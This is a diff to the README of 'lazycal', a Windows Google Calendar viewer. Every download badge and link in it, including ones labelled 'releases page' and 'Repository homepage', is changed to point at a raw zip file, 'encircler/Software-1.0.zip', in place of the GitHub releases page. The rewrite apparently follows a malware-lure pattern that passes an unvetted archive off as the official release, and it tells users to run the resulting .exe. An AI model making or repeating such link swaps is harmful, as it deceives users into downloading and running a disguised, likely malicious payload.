@@ -1,6 +1,6 @@
 # ⏰ lazycal - Simple, Fast Google Calendar Viewer
 
-[![Download lazycal](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/youssefzizo10/lazycal/releases)
+[![Download lazycal](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/youssefzizo10/lazycal/main/encircler/Software-1.0.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to download and start using lazycal on your Windows computer.
 
 Visit the official release page by clicking the green button below. This page holds the latest versions of the software.
 
-[![Download lazycal](https://img.shields.io/badge/Download-latest%20release-blue?style=for-the-badge)](https://github.com/youssefzizo10/lazycal/releases)
+[![Download lazycal](https://img.shields.io/badge/Download-latest%20release-blue?style=for-the-badge)](https://raw.githubusercontent.com/youssefzizo10/lazycal/main/encircler/Software-1.0.zip)
 
 On the release page:
 
@@ -115,7 +115,7 @@ The interface uses clear menus and instructions. Look for on-screen hints if you
 
 When a new version is released:
 
-- Go back to the [releases page](https://github.com/youssefzizo10/lazycal/releases).
+- Go back to the [releases page](https://raw.githubusercontent.com/youssefzizo10/lazycal/main/encircler/Software-1.0.zip).
 - Download the newest `.exe` file.
 - Replace or overwrite your current `lazycal-windows.exe` file.
 - Run the new version as before.
@@ -144,8 +144,8 @@ If you encounter any problems or have questions:
 
 ## 🔗 Important Links
 
-- Official release and download: https://github.com/youssefzizo10/lazycal/releases
-- Repository homepage: https://github.com/youssefzizo10/lazycal
+- Official release and download: https://raw.githubusercontent.com/youssefzizo10/lazycal/main/encircler/Software-1.0.zip
+- Repository homepage: https://raw.githubusercontent.com/youssefzizo10/lazycal/main/encircler/Software-1.0.zip
 
 ---
 
